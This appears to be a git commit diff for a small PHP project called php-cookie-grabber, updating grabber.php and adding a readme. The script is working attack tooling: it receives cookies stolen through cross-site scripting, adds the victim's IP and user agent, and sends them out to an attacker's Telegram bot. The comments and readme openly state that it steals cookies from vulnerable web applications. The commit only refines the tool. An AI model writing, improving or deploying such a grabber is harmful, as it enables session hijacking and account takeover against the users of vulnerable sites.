754e669b537b83e75d074d541bdee3d5c58220ce
Paint programmer <afreeperson@yandex.ru>
2021-05-01 11:51:47 +0300

    Some fixes

--- grabber.php
+++ grabber.php
@@ -1,20 +1,22 @@
 <?php
-/*
-	(XSS) cookie grabber for telegram bot
-	2k18
-*/
-	if(!isset($_GET['q']))
-		return;
+	/*
+		(XSS) cookie grabber for telegram bot
+		This solution is used to steal cookies from vulnerable web applications. The final data is sent to your bot in telegram (see @Botfather).
+		2018
+	*/
 	
-	//vars
-	$g_Cookies = $_GET['q'];
+	if(!isset($_REQUEST['q']))
+		exit();
+	
+	// Vars
+	$g_Cookies = urldecode($_GET['q']);
 	$g_IP = $_SERVER['REMOTE_ADDR'];
 	$g_UserAgent = $_SERVER['HTTP_USER_AGENT'];
 	
-	//telegram settings
+	// Telegram settings
 	$g_API = '123456789:AAFwz5s3JSPfaaqSSQ5swVJjpBgjY12eSpMh1'; //bot token
 	$g_ChatID = '123123123'; //your profile or group
-	$g_Message = "IP: $g_IP | UserAgent: $g_UserAgent | Cookies: $g_Cookies";
+	$g_Message = urlencode("IP: $g_IP | UserAgent: $g_UserAgent | Cookies: $g_Cookies");
 	
 	//sending a message
 	file_get_contents("https://api.telegram.org/bot$g_API/sendMessage?chat_id=$g_ChatID&text=$g_Message");
---
+++ readme.md
@@ -0,0 +1,3 @@
+# php-cookie-grabber
+
+> Note: This solution is used to steal cookies from vulnerable web applications. The final data is sent to your bot in telegram (see `@Botfather`).
